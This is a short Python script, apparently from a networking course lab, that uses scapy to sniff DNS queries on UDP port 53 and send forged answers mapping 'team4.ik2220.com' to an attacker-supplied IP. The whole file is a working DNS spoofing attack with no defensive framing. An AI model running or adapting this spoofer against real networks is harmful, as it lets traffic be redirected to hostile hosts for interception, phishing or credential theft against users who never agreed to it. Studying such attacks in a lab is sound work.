from scapy.all import *
import sys

if __name__ == '__main__':
    ip = str(sys.argv[1])
    filter = "udp port 53 and ip dst "+ip

def dns_spoof(pkt):
     #    if domain in pkt[DNS].qd.qname:
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                        DNS(id=pkt[DNS].id,ancount=1,\
                            an=DNSRR(rrname="team4.ik2220.com",rdata=ip))
    send(spoofed_pkt)

sniff(filter=filter, prn=dns_spoof)